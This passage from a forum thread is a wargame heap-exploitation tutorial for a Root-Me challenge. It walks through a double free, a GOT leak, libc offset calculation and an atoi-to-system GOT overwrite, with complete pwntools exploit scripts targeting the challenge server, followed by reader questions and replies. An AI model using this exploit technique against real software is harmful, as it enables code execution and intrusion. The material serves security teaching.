<li>Oh no! we ended up in a crash while freeing both, letâ€™s try changing the exploit a bit to fit that!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
</code></pre>
<ul>
<li>Now that, seems just PERFECT!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/2/2176badcbef1465ca610e81b8e2780f4bcb7face.png" width="681" height="221"></p>
<ul>
<li>And here we gooo!</li>
<li>We got a heap_leak, but thatâ€™s not what we are looking for, we should get a libc_leak!</li>
<li>Remember the bug we found but didnâ€™t use, that let us overwrite the *name, weâ€™ll try using it now..</li>
<li>We got to find a way to overwrite the *name of a chunk thatâ€™s in-use!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)

allocate( 'A'*16, 15 )
</code></pre>
<ul>
<li>Nothing happens here, so letâ€™s free chunk 0, and allocate twice..</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*16, 15 )
allocate( 'A'*16, 15 )
</code></pre>
<ul>
<li>What, we got sigsegv when we tried to print entries!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/6915266130fcd71c03fdce5a2baec48f050c8ccc.png" width="378" height="61"></p>
<ul>
<li>Seems weird, the first guess is that it tried reading from address 0x4141414141414141.</li>
<li>Which is overwritten name pointer in chunk2!</li>
<li>Letâ€™s examine in GDB to make sure!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/f/f2df79a19bb86d553b5811240d24d81a504047f8.png" width="642" height="188"></p>
<ul>
<li>And yeah, it treated the AAAAAAAA as a PTR!</li>
<li>Letâ€™s see now what we can do!</li>
<li>We will add a part in exploit.py!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># ENTRIES
free_got = 0x602018
</code></pre>
<p>We will also write a little function to return the address in littleendian.. since p64() didnâ€™t put the address correctly in this example..</p>
<pre data-code-wrap="py"><code class="lang-py">def revaddr(addr):
	h = hex(addr)[2:]
	t = ""
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t
</code></pre>
<p>And then letâ€™s comeback to exploit part and edit our exploit making the *name point to free_got!</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(free_got), 15 )
</code></pre>
<ul>
<li>Awesome, now letâ€™s try showing entries! <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/f/f870367725ea1062be501189966d37a805012724.png" width="375" height="76"> </p>
<ul>
<li>Perfect, now we got a libc_leak!</li>
<li>We are going to use view() function to store the leak!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(free_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
print 'free() @ ' + hex(leak)
</code></pre>
<ul>
<li>I prefer changing atoi_got since itâ€™s an easier and more guaranteed way to get shell!</li>
</ul>
<pre data-code-wrap="c"><code class="lang-c">int choice(int min, int max, char * chaine) {
    int i;
    char buf[6];
    i = -1;
    while( (i &lt; min) || (i &gt; max)) {
        printf("%s", chaine);
        fgets(buf, 5, stdin);
        i = atoi(buf); // HERE
    }
    return i ;
}
</code></pre>
<ul>
<li>Great, now we know where atoi actually is, letâ€™s calculate where libc_base will be!</li>
<li>Iâ€™ll use GDB!</li>
<li>Using vmmap i got libc_base, and we leaked the address of atoi_got!</li>
<li>Letâ€™s calculate atoi_got - libc_base and system - libc_base!</li>
</ul>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/6/64822c837451b6f78ae9caed3603e7b5bb7907c6.png" data-download-href="/uploads/short-url/el8DSQ0nNOhCbApajyXyZN3WBzU.png?dl=1" title="he_p24.png" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/64822c837451b6f78ae9caed3603e7b5bb7907c6.png" width="690" height="276"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">he_p24.png</span><span class="informations">720Ã—289 148 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<ul>
<li>Great, letâ€™s create a new part in exploit.py</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># DIFF LOCAL
libcdiff = 0x34260
sysdiff = 0x3f460
</code></pre>
<p>Letâ€™s now make use of them in the exploit part!</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print 'libc_base @ ' + hex(libc_base)
print 'system() @' + hex(system)
</code></pre>
<ul>
<li>Letâ€™s test the exploit and see where we going!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/b/b51ba7bddc047b528678ce14f58a026f4accee3d.png" width="405" height="183"></p>
<ul>
<li>Great! now, letâ€™s use the change() function that we spoke about, and change the content of atoi_got to system!</li>
<li>So in the end the exploit part will become the following!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print 'libc_base @ ' + hex(libc_base)
print 'system() @' + hex(system)

edit( 1, p64(system), 'sh\x00' )
</code></pre>
<ul>
<li>Alright letâ€™s run the exploit now!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/e01621bad284375c9bb061d458ca51d2f1a1e551.png" width="414" height="146"></p>
<ul>
<li>Awesome, we got our shell, but thatâ€™s in local only..</li>
<li>Letâ€™s first collect all parts in our current exploit.py!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py">#!/usr/bin/python
from pwn import *

# ENTRIES
atoi_got = 0x602078

# PROCESS
c = process("./ch44")

# DIFF LOCAL
libcdiff = 0x34260
sysdiff = 0x3f460

# FUNCTIONS
def allocate( nm, age ):
	c.sendline('1')
	c.recvuntil(': ')
	c.sendline( nm )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def free( id ):
	c.sendline('2')
	c.recvuntil(': ')
	c.sendline(str(id))
	c.recvuntil('&gt;')
def view( id ):
	c.sendline('4')
	c.recvuntil('[' + str(id) + '] ')
	name = c.recvuntil(', ')[:-2]
	age = c.recvuntil(' years')[:-6]
	c.recvuntil('&gt;')
	return name, age
def edit( id, name, age ):
	c.sendline('3')
	c.recvuntil(': ')
	c.sendline( str(id) )
	c.recvuntil(': ')
	c.sendline( name )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def revaddr(addr):
	h = hex(addr)[2:]
	t = ""
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t

# ATTACH
pause()

# EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print 'libc_base @ ' + hex(libc_base)
print 'system() @' + hex(system)

edit( 1, p64(system), 'sh\x00' )

# INTERACTIVE
c.interactive()
</code></pre>
<ul>
<li>Letâ€™s connect to the server and see the libc used!</li>
<li>Weâ€™ll run the program using gdb then break using CTRL + C then:</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/cc4de18358aa5f2c4b6d0ca27fba8c4d5dbb6fe5.png" width="677" height="64"></p>
<ul>
<li>So the libc is located at : /lib/x86_64-linux-gnu/libc.so.6</li>
<li>Iâ€™ll download it, and iâ€™ll use libcdatabase tool:</li>
</ul>
<aside class="onebox githubrepo" data-onebox-src="../../../external.html?link=https://github.com/niklasb/libc-database">
  <header class="source">

      <a href="../../../external.html?link=https://github.com/niklasb/libc-database" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <div class="github-row" data-github-private-repo="false">
  <img width="690" height="344" src="../../../external.html?link=https://opengraph.githubassets.com/9138e18a8bfd730395cbec6d645f9a2b/niklasb/libc-database" class="thumbnail">

  <h3><a href="../../../external.html?link=https://github.com/niklasb/libc-database" target="_blank" rel="noopener nofollow ugc">GitHub - niklasb/libc-database: Build a database of libc offsets to simplify...</a></h3>

    <p><span class="github-repo-description">Build a database of libc offsets to simplify exploitation</span></p>
</div>

  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/1/1077aebe71c5e82a64d6c26a3fcda957553d430c.png" data-download-href="/uploads/short-url/2lG3C6M6weCi5ckxaPKnhGQdvhq.png?dl=1" title="he_p28.png" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/1/1077aebe71c5e82a64d6c26a3fcda957553d430c.png" width="690" height="124"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">he_p28.png</span><span class="informations">716Ã—129 79.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<ul>
<li>then weâ€™ll use libcdatabase â†’ ./add libc.so.6</li>
</ul>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/e/ea7c0079d24f3aadb6f8eab854ed2bc2e968764a.png" data-download-href="/uploads/short-url/xsloQPXSfDr9mAXLNgiiEpN1iFI.png?dl=1" title="he_p29.png" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/e/ea7c0079d24f3aadb6f8eab854ed2bc2e968764a.png" width="690" height="242"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">he_p29.png</span><span class="informations">725Ã—255 136 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<ul>
<li>We got everything we need, except atoi!</li>
</ul>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/c/c17a63a660a7b94444fa13057bdb88ce20506725.png" width="690" height="56"></p>
<ul>
<li>We will now edit a part in exploit.py!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># DIFF REMOTE
libcdiff = 0x39ea0
sysdiff = 0x46590
</code></pre>
<ul>
<li>And we will also set c to remote!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># REMOTE
c = remote( 'challenge03.root-me.org', 56544 )
</code></pre>
<ul>
<li>The full exploit now looks like this:</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py">#!/usr/bin/python
from pwn import *

# ENTRIES
atoi_got = 0x602078

# REMOTE
c = remote( 'challenge03.root-me.org', 56544 )

# DIFF REMOTE
libcdiff = 0x39ea0
sysdiff = 0x46590

# FUNCTIONS
def allocate( nm, age ):
	c.sendline('1')
	c.recvuntil(': ')
	c.sendline( nm )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def free( id ):
	c.sendline('2')
	c.recvuntil(': ')
	c.sendline(str(id))
	c.recvuntil('&gt;')
def view( id ):
	c.sendline('4')
	c.recvuntil('[' + str(id) + '] ')
	name = c.recvuntil(', ')[:-2]
	age = c.recvuntil(' years')[:-6]
	c.recvuntil('&gt;')
	return name, age
def edit( id, name, age ):
	c.sendline('3')
	c.recvuntil(': ')
	c.sendline( str(id) )
	c.recvuntil(': ')
	c.sendline( name )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def revaddr(addr):
	h = hex(addr)[2:]
	t = ""
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t

# ATTACH
pause()

# EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print 'libc_base @ ' + hex(libc_base)
print 'system() @' + hex(system)

edit( 1, p64(system), 'sh\x00' )

# INTERACTIVE
c.interactive()
</code></pre>
<ul>
<li>Letâ€™s now run the exploit and see the result..</li>
</ul>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/6/6a88b96bad34519080cd2acaaf554f97cd43a26a.png" data-download-href="/uploads/short-url/fcrxCHTGk0N2HSNvKP8XEXeSbAS.png?dl=1" title="he_p31.png" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/6/6a88b96bad34519080cd2acaaf554f97cd43a26a.png" width="690" height="162"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">he_p31.png</span><span class="informations">706Ã—166 72.8 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<ul>
<li>And we got our shell!</li>
<li>Hope you enjoyed, and learned too! <img src="../../images/emoji/twitter/slight_smile8e5e.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></li>
<li>See you all in next article <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></li>
</ul>
<p>~ exploit</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="20" />
              <span class='post-likes'>20 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-05-18T22:31:59Z' class='post-time'>
                    May 18, 2017, 10:31pm
                  </time>
                  <meta itemprop='dateModified' content='2017-05-18T22:31:59Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This has been my first encounter with heap exploitation, and Iâ€™ve got to say, I learnt a lot just reading through this.</p>
<p>Slightly unrelated things as well, such as <code>gdb --pid</code>, or the <code>c = process()</code> syntax. Little things like this are really super helpful when youâ€™re starting out in Exploit Dev.</p>
<p>The ASLR bypass is also interesting to note, I never knew the libc-database tool existed, using this tool, would the libc offsets be consistent across machines? Or is it something that is specific?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-05-18T22:46:25Z' class='post-time'>
                    May 18, 2017, 10:46pm
                  </time>
                  <meta itemprop='dateModified' content='2017-05-18T22:46:25Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>The goal of using that tool was getting the address of system(), knowing that libc file is provided !</li>
<li>Also sometimes, the libc file isnâ€™t provided, so a website is used, which is: <a href="../../../external.html?link=http://libcdb.com/" rel="noopener nofollow ugc">libcdb.com</a>! ( will be discussed maybe later <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"> )</li>
<li>Only the libc_base is randomized, the differences stay the same! <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></li>
<li>the thing you should now is: if you know the address of a function in libc, and keep in mind that difference between addresses in libc doesnâ€™t change, but stays the same, you can calculate it!</li>
<li>But to do so, you should have the differences, thatâ€™s why i used libcdatabase, to help me get libc_base, by substracting the diff of the leaked functionâ€™s address from the leaked address!</li>
<li>And then adding the system_diff to the result of substraction, that would get system() address in libc!</li>
</ul>
<blockquote>
<p>Conclusion : if you have the libc, you can get the difference of every libc function from libc_base and then calculate the address of system() or whatever you want in libc easily! <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
</blockquote>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="4" />
              <span class='post-likes'>4 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-05-18T22:57:01Z' class='post-time'>
                    May 18, 2017, 10:57pm
                  </time>
                  <meta itemprop='dateModified' content='2017-05-18T22:57:01Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Ah, that makes much more sense. Another question: How did you find the EIP? I am assuming that is the pointer you overwrote. Was it just trial and error?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-05-18T23:03:51Z' class='post-time'>
                    May 18, 2017, 11:03pm
                  </time>
                  <meta itemprop='dateModified' content='2017-05-19T11:26:13Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <ul>
<li>We didnâ€™t change the saved RIP like the last article <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:"> !</li>
<li>This time we went more creative by changing a GOT entry, making it point to calculated system() !</li>
<li>Then using that to pop a shell <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:">
</li>
<li>We changed atoi_got to calculated system() address, then knowing where atoi() is used, by viewing the source:</li>
</ul>
<pre><code class="lang-auto">int choice(int min, int max, char * chaine) {
    int i;
    char buf[6];
    i = -1;
    while( (i &lt; min) || (i &gt; max)) {
        printf("%s", chaine);
        fgets(buf, 5, stdin);
        i = atoi(buf); // HERE
    }
    return i ;
}
</code></pre>
<ul>
<li>So, when we input our choice, atoi() is called on the userinput, well if we set atoi() to system() it will be:</li>
<li>system(buf), and that will lead to a shell, if the input is â€œsh\x00â€ <img src="../../../0x00sec.org/images/emoji/twitter/smileyc164.html?v=9" title=":smiley:" class="emoji" alt=":smiley:"> !</li>
</ul>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="3" />
              <span class='post-likes'>3 Likes</span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/BlahCat007.html'><span itemprop='name'>BlahCat007</span></a>
                (Onizuka)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-09T13:04:49Z' class='post-time'>
                    August 9, 2017,  1:04pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-09T13:04:49Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Supa Hot fire , I like your articles , detailed info and helpful keep going</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/exploit.html'><span itemprop='name'>exploit</span></a>
                (exploit)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2017-08-09T13:12:09Z' class='post-time'>
                    August 9, 2017,  1:12pm
                  </time>
                  <meta itemprop='dateModified' content='2017-08-09T13:12:09Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thank you *_* <img src="../../../0x00sec.org/images/emoji/twitter/smilec164.html?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/IdanBanani.html'><span itemprop='name'>IdanBanani</span></a>
                (Idan BananI)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2021-04-09T07:41:38Z' class='post-time'>
                    April 9, 2021,  7:41am
                  </time>
                  <meta itemprop='dateModified' content='2021-04-09T07:41:38Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Too bad the images are dead.<br>
Currently, for some reason - the binary running on the server (When you make a TCP connection to it like in here) is using/loading/linked against a newer (2018) version of glibc , so Tcache is enabled and has double free mitigation (goes through the whole cache) and you need to do some kind of tcache poisionning to overcome it.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="wZF24Cm0RdROKqo1kh52kzLOp"></script>
  </body>
  
</html>
